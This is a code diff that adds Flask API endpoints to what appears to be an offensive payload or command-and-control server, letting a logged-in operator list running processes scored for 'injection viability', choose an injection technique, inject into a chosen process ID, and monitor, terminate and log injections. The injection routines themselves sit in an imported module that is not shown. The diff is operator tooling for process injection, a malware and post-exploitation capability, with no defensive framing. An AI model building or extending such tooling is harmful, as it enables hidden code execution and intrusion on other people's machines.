@@ -929,6 +929,142 @@ def configure_payload():
         return jsonify({'status': 'error', 'message': str(e)}), 500
 
 # Development test endpoint (remove in production!)
+# Process Injection API Endpoints
+@app.route('/api/inject/list-processes', methods=['GET'])
+@login_required
+def list_processes():
+    """List all running processes with injection viability scores"""
+    try:
+        from injection_manager import injection_manager
+        
+        processes = injection_manager.enumerate_processes()
+        
+        # Filter based on query parameters
+        show_system = request.args.get('show_system', 'false').lower() == 'true'
+        show_critical = request.args.get('show_critical', 'false').lower() == 'true'
+        only_injectable = request.args.get('only_injectable', 'false').lower() == 'true'
+        
+        filtered = []
+        for proc in processes:
+            if not show_system and proc['username'] in ['SYSTEM', 'root']:
+                continue
+            if not show_critical and proc['is_critical']:
+                continue
+            if only_injectable and not proc['is_injectable']:
+                continue
+            filtered.append(proc)
+        
+        return jsonify({
+            'success': True,
+            'count': len(filtered),
+            'processes': filtered[:100]  # Limit to 100 for performance
+        })
+        
+    except Exception as e:
+        return jsonify({'success': False, 'error': str(e)}), 500
+
+@app.route('/api/inject/techniques', methods=['GET'])
+@login_required
+def get_injection_techniques():
+    """Get available injection techniques for current platform"""
+    try:
+        from injection_manager import injection_manager
+        
+        techniques = injection_manager.get_available_techniques()
+        
+        return jsonify({
+            'success': True,
+            'platform': injection_manager.platform,
+            'techniques': techniques
+        })
+        
+    except Exception as e:
+        return jsonify({'success': False, 'error': str(e)}), 500
+
+@app.route('/api/inject/execute', methods=['POST'])
+@login_required
+@limiter.limit("10 per hour")
+def execute_injection():
+    """Execute process injection"""
+    try:
+        from injection_manager import injection_manager
+        
+        data = request.json or {}
+        
+        # Validate required fields
+        if 'pid' not in data or 'technique' not in data:
+            return jsonify({'success': False, 'error': 'Missing required fields'}), 400
+        
+        # Execute injection
+        result = injection_manager.execute_injection(data)
+        
+        if result['success']:
+            log_debug(f"Injection successful: PID {data['pid']}, Technique: {data['technique']}", 
+                     "INFO", "Injection")
+            return jsonify(result)
+        else:
+            log_debug(f"Injection failed: {result.get('error')}", "ERROR", "Injection")
+            return jsonify(result), 500
+            
+    except Exception as e:
+        log_debug(f"Injection error: {str(e)}", "ERROR", "Injection")
+        return jsonify({'success': False, 'error': str(e)}), 500
+
+@app.route('/api/inject/status/<injection_id>', methods=['GET'])
+@login_required
+def get_injection_status(injection_id):
+    """Get status of an injection"""
+    try:
+        from injection_manager import injection_manager
+        
+        status = injection_manager.get_injection_status(injection_id)
+        
+        if 'error' in status:
+            return jsonify({'success': False, 'error': status['error']}), 404
+        
+        return jsonify({
+            'success': True,
+            'status': status
+        })
+        
+    except Exception as e:
+        return jsonify({'success': False, 'error': str(e)}), 500
+
+@app.route('/api/inject/terminate/<injection_id>', methods=['POST'])
+@login_required
+def terminate_injection(injection_id):
+    """Terminate an active injection"""
+    try:
+        from injection_manager import injection_manager
+        
+        success = injection_manager.terminate_injection(injection_id)
+        
+        if success:
+            return jsonify({'success': True, 'message': 'Injection terminated'})
+        else:
+            return jsonify({'success': False, 'error': 'Injection not found'}), 404
+            
+    except Exception as e:
+        return jsonify({'success': False, 'error': str(e)}), 500
+
+@app.route('/api/inject/history', methods=['GET'])
+@login_required
+def get_injection_history():
+    """Get injection history"""
+    try:
+        from injection_manager import injection_manager
+        
+        history = injection_manager.get_injection_history()
+        
+        return jsonify({
+            'success': True,
+            'count': len(history),
+            'history': history
+        })
+        
+    except Exception as e:
+        return jsonify({'success': False, 'error': str(e)}), 500
+
 @app.route('/api/test-native-payload', methods=['POST'])
 def test_native_payload():
     """Test endpoint for native payload generation - DEV ONLY"""
